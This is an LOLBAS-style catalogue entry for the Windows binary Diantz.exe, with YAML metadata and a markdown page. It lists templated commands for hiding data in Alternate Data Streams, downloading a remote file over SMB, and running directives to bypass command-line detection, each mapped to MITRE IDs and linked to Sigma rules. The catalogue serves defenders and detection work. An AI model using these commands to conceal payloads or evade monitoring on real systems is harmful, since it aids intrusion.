---
Acknowledgement:
- Handle: '@tim8288'
  Person: Tamir Yehuda
- Person: Hai Vak
Author: Tamir Yehuda
Commands:
- Category: ADS
  Command: diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
  Description: Compress a file (first argument) into a CAB file stored in the Alternate
    Data Stream (ADS) of the target file.
  MitreID: T1564.004
  OperatingSystem: Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.
  Privileges: User
  Tags:
  - Type: Compression
  Usecase: Hide data compressed into an Alternate Data Stream.
- Category: Download
  Command: diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
  Description: Download and compress a remote file and store it in a CAB file on local
    machine.
  MitreID: T1105
  OperatingSystem: Windows Server 2012, Windows Server 2012R2, Windows Server 2016,
    Windows Server 2019
  Privileges: User
  Tags:
  - Type: Compression
  Usecase: Download and compress into a cab file.
- Category: Execute
  Command: diantz /f {PATH:.ddf}
  Description: Execute diantz directives as defined in the specified Diamond Definition
    File (.ddf); see resources for the format specification.
  MitreID: T1036
  OperatingSystem: Windows Server 2012, Windows Server 2012R2, Windows Server 2016,
    Windows Server 2019
  Privileges: User
  Tags:
  - Type: Compression
  Usecase: Bypass command-line based detections
Created: 2020-08-08
Description: Binary that package existing files into a cabinet (.cab) file
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_diantz_ads.yml
- Sigma: https://github.com/SigmaHQ/sigma/blob/62d4fd26b05f4d81973e7c8e80d7c1a0c6a29d0e/rules/windows/process_creation/proc_creation_win_lolbin_diantz_remote_cab.yml
- IOC: diantz storing data into alternate data streams.
- IOC: diantz getting a file from a remote machine or the internet.
Full_Path:
- Path: c:\windows\system32\diantz.exe
- Path: c:\windows\syswow64\diantz.exe
Name: Diantz.exe
Resources:
- Link: https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz
- Link: https://ss64.com/nt/makecab-directives.html
mitre_data:
  technique_ids:
  - T1564.004
  - T1105
  - T1036
tags:
- lolbas/osbinaries
---

# Diantz.exe

Binary that package existing files into a cabinet (.cab) file

# Path(s)

- `c:\windows\system32\diantz.exe`
- `c:\windows\syswow64\diantz.exe`

# Execute Commands

Execute diantz directives as defined in the specified Diamond Definition File (.ddf); see resources for the format specification.

```batch
diantz /f {PATH:.ddf}
```

- **Usecase:** Bypass command-line based detections
- **Privileges Required:** User
- **MitreID:** `T1036`
- **Operating System(s):** Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019



# ADS Commands

Compress a file (first argument) into a CAB file stored in the Alternate Data Stream (ADS) of the target file.

```batch
diantz.exe {PATH_ABSOLUTE:.exe} {PATH_ABSOLUTE}:targetFile.cab
```

- **Usecase:** Hide data compressed into an Alternate Data Stream.
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows XP, Windows vista, Windows 7, Windows 8, Windows 8.1.



# Download Commands

Download and compress a remote file and store it in a CAB file on local machine.

```batch
diantz.exe {PATH_SMB:.exe} {PATH_ABSOLUTE:.cab}
```

- **Usecase:** Download and compress into a cab file.
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows Server 2012, Windows Server 2012R2, Windows Server 2016, Windows Server 2019



# Resource(s)

- https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diantz
- https://ss64.com/nt/makecab-directives.html
# Acknowledgements

- Tamir Yehuda (Authored, 2020-08-08)
- Tamir Yehuda (@tim8288)
- Hai Vak